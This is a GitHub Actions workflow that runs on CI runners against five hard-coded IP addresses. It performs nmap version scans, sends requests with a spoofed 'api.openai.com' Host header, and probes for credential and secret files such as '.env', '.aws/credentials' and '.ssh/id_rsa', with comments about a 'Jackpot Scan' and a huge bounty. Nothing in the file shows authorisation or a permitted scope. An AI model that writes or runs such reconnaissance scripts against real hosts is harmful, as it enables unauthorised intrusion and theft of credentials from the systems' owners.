name: Parallel OpenAI oombi

on:
  workflow_dispatch:

jobs:
  audit-origins:
    name: Audit IP ${{ matrix.target_ip }}
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        # Fixed the list formatting to be strictly compliant
        target_ip: 
          - "43.202.58.124"
          - "43.202.58.199"
          - "13.125.127.14"
          - "43.202.58.155"
          - "43.202.58.133"

    steps:
      - name: Install Security Tools
        run: |
          sudo apt-get update
          sudo apt-get install -y nmap curl

      - name: 1. Service & Version Detection
        # This checks if the server is leaking specific software versions (exploitable)
        run: |
          echo "### Infrastructure Report for ${{ matrix.target_ip }} ###" > report.md
          echo "Scan Time: $(date)" >> report.md
          nmap -sV -T4 -Pn -p 22,80,443,3306,8080,8443,9000 ${{ matrix.target_ip }} >> report.md

      - name: 2. Host-Header Bypass Evidence
        run: |
          echo -e "\n### HTTP Evidence (api.openai.com) ###" >> report.md
          # Grabbing full headers to see Server types and X-Headers
          curl -I -s -H "Host: api.openai.com" http://${{ matrix.target_ip }}/ >> report.md
          
          echo -e "\n--- Branded Asset Search ---" >> report.md
          # Search for OpenAI favicon in WordPress feeds
          curl -s -H "Host: api.openai.com" http://${{ matrix.target_ip }}/feed/ | grep -o "favicon-100x100.png" >> report.md || echo "No favicon found." >> report.md
          # Search for internal Matomo config leaks
          curl -s -H "Host: api.openai.com" http://${{ matrix.target_ip }}/ | grep "trusted_hosts" >> report.md || echo "No Matomo config leak." >> report.md

      - name: 3. The Jackpot Scan (Sensitive Files)
        # These are the P1+ files. If any return 200, the bounty is huge.
        run: |
          echo -e "\n--- Critical File Discovery ---" >> report.md
          PATHS=(".env" ".git/config" "phpinfo.php" "wp-config.php.bak" ".aws/credentials" ".bash_history" ".ssh/id_rsa")
          for path in "${PATHS[@]}"; do
            STATUS=$(curl -s -o /dev/null -w "%{http_code}" -m 3 -H "Host: api.openai.com" http://${{ matrix.target_ip }}/$path)
            if [ "$STATUS" == "200" ]; then
              echo "[CRITICAL] Found $path - Status $STATUS" >> report.md
            else
              echo "Path $path - Status $STATUS" >> report.md
            fi
          done

      - name: Upload Report
        uses: actions/upload-artifact@v4
        with:
          name: audit-${{ matrix.target_ip }}
          path: report.md
          
